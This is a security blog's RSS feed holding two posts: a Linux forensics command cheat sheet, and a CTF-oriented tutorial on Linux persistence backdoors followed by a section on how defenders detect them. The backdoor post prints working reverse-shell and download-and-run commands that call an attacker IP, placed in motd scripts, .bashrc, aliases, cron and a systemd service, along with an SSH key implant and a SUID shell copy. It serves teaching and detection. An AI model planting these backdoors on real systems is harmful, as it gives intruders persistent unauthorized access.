<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Forensics on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/forensics/</link>
    <description>Recent content in Forensics on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 16 Jun 2021 19:15:16 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/forensics/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Linux Forensics Command Cheat Sheet</title>
      <link>https://fahmifj.github.io/blog/linux-forensics-command-cheat-sheet/</link>
      <pubDate>Wed, 16 Jun 2021 19:15:16 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/linux-forensics-command-cheat-sheet/</guid>
      <description>My small cheat sheet for forensics and incident response on Linux systems</description>
      <content:encoded><![CDATA[<h2 id="users-related">Users-related</h2>
<p>Last login</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ lastlog
$ last
</code></pre></div><p>Users with login shells</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat /etc/passwd <span class="p">|</span> grep sh$
</code></pre></div><p>List users' cron</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>

<span class="c1"># users with shells only</span>
$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> grep sh$ <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>
</code></pre></div><p>SSH authorized keys</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ find / -type f -name authorized_keys
</code></pre></div><h2 id="processes-and-networking">Processes and Networking</h2>
<p>Show process tree with username  TTY, and wide output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ps auxfww
</code></pre></div><p>Process details</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ lsof -p <span class="o">[</span>pid<span class="o">]</span>
</code></pre></div><p>Show all connections don&rsquo;t resolve names (IP only)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ lsof -i -n
$ netstat -anp

<span class="c1"># Look for tcp only</span>
$ netstat -antp
$ ss -antp
</code></pre></div><p>List all services</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ service --status-all
</code></pre></div><p>List firewall rules</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ iptables --list-rules
</code></pre></div><p>List all timers</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ systemctl list-timers --all
</code></pre></div><p>DNS related</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">/etc/hosts
/etc/resolv.conf
</code></pre></div><h2 id="files-and-folders">Files and Folders</h2>
<p>Show list files and folder with nano timestamp, sort by modification time (newest).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ls --full-time -lt 
</code></pre></div><p>List all files that were modified on a specific date/time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># List files which were modified on 2021-06-16 (YYYY-MM-DD)</span>
$ find / -newermt <span class="s2">&#34;2021-06-16&#34;</span> -ls 2&gt;/dev/null

<span class="c1"># List files which were modified on 2021-05-01 until 2021-05-09 (9 days ago)</span>
$ find / -newermt <span class="s2">&#34;2021-05-01&#34;</span> ! -newermt <span class="s2">&#34;2021-05-10&#34;</span> -ls 2&gt;/dev/null

<span class="c1"># List files which were modified on 2021-05-01 until 2021-05-09 (9 days ago) + add filter</span>
$ find / -newermt <span class="s2">&#34;2021-05-01&#34;</span> ! -newermt <span class="s2">&#34;2021-05-10&#34;</span> -ls 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;filterone\|filtertwo&#39;</span>

<span class="c1"># List files modified between 01:00 and 07:00 on June 16 2021.</span>
$ find / -newermt <span class="s2">&#34;2021-06-16 01:00:00&#34;</span> ! -newermt <span class="s2">&#34;2021-06-16 07:00:00&#34;</span> -ls 2&gt;/dev/null

<span class="c1"># List files that were accessed exactly 2 days ago.</span>
$ find / -atime <span class="m">2</span> -ls 2&gt;/dev/null

<span class="c1"># List files that were modified in the last 2 days.</span>
$ find / -mtime -2 -ls 2&gt;/dev/null
</code></pre></div><p>File inspection</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ stat <span class="o">[</span>file<span class="o">]</span>
$ exiftool <span class="o">[</span>file<span class="o">]</span>
</code></pre></div><p>Observe changes in files</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ find . -type f -exec md5sum <span class="o">{}</span> <span class="se">\;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> grep <span class="s1">&#39; 1 &#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $2	}&#39;</span>
</code></pre></div><p>Look for <code>cap_setuid+ep</code> in binary capabilities</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ getcap -r /usr/bin/
$ getcap -r /bin/
$ getcap -r / 2&gt;/dev/null
</code></pre></div><p>SUID</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null
</code></pre></div><p>Log auditing</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># 3rd party</span>
$ aureport --tty
</code></pre></div><h2 id="persistence-areas">Persistence areas</h2>
<p>Directories:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">/etc/cron*/
/etc/incron.d/*
/etc/init.d/*
/etc/rc*.d/*
/etc/systemd/system/*
/etc/update.d/*
/var/spool/cron/*
/var/spool/incron/*
/var/run/motd.d/*
</code></pre></div><p>Files:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">/etc/passwd
/etc/sudoers
/home/&lt;user&gt;/.ssh/authorized_keys
/home/&lt;user&gt;/.bashrc
</code></pre></div><h2 id="references">References</h2>
<ul>
<li><a href="https://stackoverflow.com/questions/18339307/find-files-in-created-between-a-date-range">https://stackoverflow.com/questions/18339307/find-files-in-created-between-a-date-range</a></li>
<li><a href="https://unix.stackexchange.com/questions/119598/as-root-how-can-i-list-the-crontabs-for-all-users">https://unix.stackexchange.com/questions/119598/as-root-how-can-i-list-the-crontabs-for-all-users</a></li>
<li><a href="https://unix.stackexchange.com/questions/169798/what-does-newermt-mean-in-find-command">https://unix.stackexchange.com/questions/169798/what-does-newermt-mean-in-find-command</a></li>
<li><a href="https://ippsec.rocks/">https://ippsec.rocks/</a></li>
<li><a href="https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html#incron">https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html#incron</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Linux Backdoors and Where to Find Them</title>
      <link>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</link>
      <pubDate>Tue, 25 May 2021 18:49:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</guid>
      <description>Learn some backdoor techniques and how to deal with them!</description>
      <content:encoded><![CDATA[<p>[Updated 25-06-2021]</p>
<p>In Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.</p>
<h2 id="backdoors-what-is-it">Backdoors, what is it?</h2>
<p>Well, I&rsquo;m not going to go into as much detail as <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)">Wikipedia</a>, but here&rsquo;s:</p>
<p>A backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don’t have to exploit the same system twice. It simply gives you quicker and instant access to the system.</p>
<p>Now that we know what a backdoor is, let&rsquo;s find out where the attackers typically hide them in a <strong>Linux</strong> system. For demonstration, I’ll be using the <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">Pinky’s Palace</a> machine from VulnHub, and let’s pretend it has been compromised.</p>
<h3 id="1-ssh-keys">1. SSH keys</h3>
<p>SSH <a href="https://www.ssh.com/academy/ssh/authorized_keys/openssh">authorized_keys</a> file contains a list of authorized users/public keys that are allowed to login into a specific account. In this file, the attackers can also place their public keys to authorize themselves and get instant access to the system via SSH.</p>
<p>For example, below are the exploitation steps to gain root access on the target system (Pinky&rsquo;s Palace).</p>
<p><div class="img-container"><img src="imgs/image-20210526004056632.png" alt="image-20210526004056632"  /></div>
</p>
<p>Of course, as an attacker, I don’t want to repeat all these exploitation steps all over again.</p>
<p>So instead, on my attacking machine, I’ll generate a new pair of <a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">SSH keys</a> specialized for backdoor.</p>
<p><div class="img-container"><img src="imgs/image-20210526004747293.png" alt="image-20210526004747293"  /></div>
</p>
<p>The newly generated SSH public key (<code>backdoor_ssh.pub</code>) can be inserted into the root  <code>authorized_keys</code> file of the compromised system as a backdoor.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mkdir -p /root/.ssh/ <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali&#39;</span> &gt; /root/.ssh/authorized_keys
</code></pre></div><p>Now by specifying <code>backdoor_ssh</code> as the identity file (private key), I’m able to gain access on the compromised system via SSH.</p>
<p><div class="img-container"><img src="imgs/image-20210526005156382.png" alt="image-20210526005156382"  /></div>
</p>
<h3 id="2-ssh-motd">2. SSH motd</h3>
<p>This is one of the cool tricks I&rsquo;ve learned from HackTheBox machine called Traceback.</p>
<p><strong>Motd</strong> (Message of the day) is the banner that appears when you log into the machine using SSH. For Ubuntu/Debian <strong>motd</strong> can be found at <code>/etc/update-motd.d</code>. By default, other users don&rsquo;t have write permission on that directory.</p>
<p><div class="img-container"><img src="imgs/image-20210526010220513.png" alt="image-20210526010220513"  /></div>
</p>
<p>In the image above, there is only one <strong>motd</strong> script called <code>10-uname</code>.</p>
<p>As an attacker, I could place a new script there as a backdoor. For example, I will put a netcat <a href="https://www.techslang.com/definition/what-is-a-reverse-shell/">reverse shell</a> script called <code>20-backdoor</code> under <code>/etc/update-motd.d/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:/etc/update-motd.d# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;&#39;</span> &gt; 20-backdoor <span class="o">&amp;&amp;</span> chmod +x 20-backdoor
</code></pre></div><p>Then I will setup a netcat listener and login into the compromised machine using a low privilege account named pinky.</p>
<p><div class="img-container"><img src="imgs/image-20210526010934360.png" alt="image-20210526010934360"  /></div>
</p>
<p>As you can see, that SSH login triggered my reverse shell backdoor.</p>
<p>But wait, I logged in using pinky. How did I end up with a root shell?</p>
<p>Here is the <a href="http://manpages.ubuntu.com/manpages/xenial/en/man5/update-motd.5.htm">answer</a>:</p>
<blockquote>
<p>&hellip;</p>
<p>​       Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at
​       each login,  and  this information is concatenated in /var/run/motd.  The order of script
​       execution is determined by the run-parts(8) &ndash;lsbsysinit  option  (basically  alphabetical
​       order, with a few caveats).</p>
<p>&hellip;</p>
</blockquote>
<h3 id="3-users-bashrc---interactive-session">3. User&rsquo;s .bashrc - Interactive session</h3>
<p><code>.bashrc</code> is one of the startup scripts used by Bourne shell aka <code>bash</code>. If there is a user who uses <code>bash</code> as their login shell, then this <code>.bashrc</code> will be executed for each interactive session they launch.</p>
<p>Here are some actions that triggers an interactive session:</p>
<p><div class="img-container"><img src="imgs/image-20210526005325944.png" alt="image-20210526005325944"  /></div>
</p>
<p>In the image above, I inserted a non malicious line script <code>echo &quot;I'm triggered&quot;</code> to my <code>.bashrc</code>. But now, as an attacker, I can put a reverse shell there, and I will just wait for someone to log in to trigger it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pinky@pinkys-palace:~$ <span class="nb">echo</span> <span class="s1">&#39;nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;&#39;</span> &gt; .bashrc
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210525220025256.png" alt="image-20210525220025256"  /></div>
</p>
<p>In the image above, I switched from <code>root</code> to user <code>pinky</code> and put a reverse shell on pinky&rsquo;s <code>.bashrc</code> file. I exited pinky&rsquo;s shell and immediately switch again to user <code>pinky</code> to trigger an interactive session.</p>
<h3 id="4-users-bashrc---aliases">4. User&rsquo;s .bashrc - Aliases</h3>
<p>As an attacker, I can also put the backdoor in the users' aliases!</p>
<p>Here is an example of a <em>backdoored</em>  <code>cd</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:~# <span class="nb">alias</span> <span class="nv">cd</span><span class="o">=</span><span class="s1">&#39;$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd&#39;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526002305189.png" alt="image-20210526002305189"  /></div>
</p>
<p>Some other tricky backdoors using alias:</p>
<ul>
<li><a href="https://github.com/nisay759/sudo-backdoor">https://github.com/nisay759/sudo-backdoor</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
</ul>
<h3 id="5-cron-jobs">5. Cron jobs</h3>
<p>Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler in Windows.</p>
<p>Here is an example of a backdoor using Cron job.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:~# <span class="nb">echo</span> <span class="s1">&#39;* * * * * root cd /tmp; wget 192.168.2.103/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor&#39;</span> &gt; /etc/cron.d/backdoor
</code></pre></div><p>What the task above does is it will download a malicious binary called &lsquo;backdoor&rsquo; from my attacking machine, and the backdoor is then executed once every minute.</p>
<p><div class="img-container"><img src="imgs/image-20210625141344607.png" alt="image-20210625141344607"  /></div>
</p>
<h3 id="6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</h3>
<p>An attacker can also create a backdoor as a service (BaaS). Here is an example of BaaS in a single file (<code>backdoor.service</code>):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
[Install]
WantedBy=multi-user.target&#39;
</code></pre></div><p>When the service is started, it launches a reverse shell to the attacker.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526013637397.png" alt="image-20210526013637397"  /></div>
</p>
<p>It can be enabled on boot by issuing the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:/etc/systemd/system# systemctl <span class="nb">enable</span> backdoor.service
</code></pre></div><h3 id="7-suid">7. SUID</h3>
<p>The last one on this post is SUID.</p>
<p>As an example, I can make a copy of bash called <code>.backdoor</code> (notice the dot) to a low privilege user but has been compromised,  and then set SUID permission on it.</p>
<p><div class="img-container"><img src="imgs/image-20210526020936681.png" alt="image-20210526020936681"  /></div>
</p>
<p>Why do I add dot?</p>
<p>Well, this is based on my observation on some people out there. They tend to just use <code>ls -l</code> rather than <code>ls -la</code>, and this becomes an advantage for attackers to put a backdoor with a dot.</p>
<p>It’s not just about SUID though, it applies to other backdoors as well (out of topic but *<em>cough</em>* and <code>.git</code> folder *<em>cough</em>*)</p>
<h2 id="blue-team-side">Blue Team side</h2>
<p>Before reading further, I’ll state that if your server (irl) gets hacked, it’s better to restore the server’s backup or completely rebuild it from scratch, because in the real world, those backdoors can be obfuscated and <strong>combined</strong> with other techniques (not to mention there might be a rootkit too), making it difficult to detect/find.</p>
<p>Also what I share here might not be that effective, but here is how I usually deal with those backdoors in attack-defense CTF.</p>
<h3 id="ssh-keys-and-bashrc">SSH keys and .bashrc.</h3>
<p>Make sure to regularly check the all the users <code>authorized_keys</code> file.</p>
<p>In the image below, there is a public key with a foreign hostname <code>kali</code> instead of <code>pinkys-palace</code>, then we should suspect it.</p>
<p><div class="img-container"><img src="imgs/image-20210605091730851.png" alt="image-20210605091730851"  /></div>
</p>
<p>Well, actually, the attackers might have tricked it to look like it was a legitimate one.</p>
<p>My workaround here is why don’t we create a ‘skeleton’ file of all the <code>authorized_keys</code> files and set a Cronjob which automatically reverts these files back to its original state, and I might perform this remotely via <code>scp</code>. This can be applied as well to handle backdoor in <code>.bashrc</code> .</p>
<blockquote>
<p>You can find the skeleton file of <code>.bashrc</code> at <code>/etc/skel</code>.</p>
</blockquote>
<h3 id="ssh-motd">SSH motd</h3>
<p>It&rsquo;s not always placed on <code>/etc/update-motd.d</code>, but make sure the <strong>motd</strong> directory is only writable by root, note the default list of <strong>motd</strong> files and apply the same thing as above (skeleton file) because the attackers might have inserted a backdoor in the original files.</p>
<p>We could also do some &lsquo;forensics&rsquo; using timestamp:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@MSI:/etc/update-motd.d# ls --full-time
</code></pre></div><p>For example, those files with the timestamp <code>000000000</code> (nano) in the image below have most likely not been modified and are still in their original state.</p>
<p><div class="img-container"><img src="imgs/image-20210605092751344.png" alt="image-20210605092751344"  /></div>
</p>
<p>After inserting a non-malicious line, the timestamp changed. From here, it&rsquo;s safe to assume that someone/something has modified it.</p>
<p><div class="img-container"><img src="imgs/image-20210605093121574.png" alt="image-20210605093121574"  /></div>
</p>
<h3 id="cronjobs-and-services">Cronjobs and Services</h3>
<p>We can monitor the process using  <code>netstat</code> and <code>ps</code> command. Anything that looks like a program with unknown IP and port supplied as its args (a reverse shell or a bind shell) is definitely suspicious.</p>
<p>To find an unwanted open port we can use this command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ netstat -antp <span class="p">|</span> grep LISTEN
</code></pre></div><p>To find a suspicious  connection we can use this command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ netstat -antp <span class="p">|</span> grep ESTABLISHED
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526034616621.png" alt="image-20210526034616621"  /></div>
</p>
<p>Sometimes the state of a reverse shell backdoor is neither ESTABLISHED nor LISTEN but SYN_SENT. This occurs when the backdoor fail to reach out the attacker.</p>
<p>To find that we can use the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ netstat -antp <span class="p">|</span> grep SYN_SENT
</code></pre></div><p>We could also check each user&rsquo;s crontab using the following command</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>

<span class="c1"># Only users who have login shell</span>
$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> grep sh$ <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>
</code></pre></div><p>There is also the <code>ps -f</code> command which is pretty good at visualizing the process tree. For example, here we know that the culprit that keeps opening the HTTPS port (443) is probably on <code>.bashrc</code> file because it gets triggered every time we launch a bash shell (interactive session).</p>
<p><div class="img-container"><img src="imgs/image-20210526034217561.png" alt="image-20210526034217561"  /></div>
</p>
<p>If you prefer the detailed view, consider to use <code>ps auxfww</code> to show process tree with username, TTY, and a wide output.</p>
<h3 id="finding-suid">Finding SUID</h3>
<p>To find some suspicious SUID we can use the <code>find</code> commands. It can also detect the SUID that started with dot!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@pinkys-palace:/etc/update-motd.d# find / -type f -perm <span class="m">4755</span> 2&gt;/dev/null
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526035623660.png" alt="image-20210526035623660"  /></div>
</p>
<p>So that&rsquo;s all for today.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.techslang.com/definition/what-is-a-reverse-shell/">https://www.techslang.com/definition/what-is-a-reverse-shell/</a></li>
<li><a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54</a></li>
<li><a href="https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/">https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/</a></li>
<li><a href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c">https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
<li><a href="https://ippsec.rocks/?#">https://ippsec.rocks/?#</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
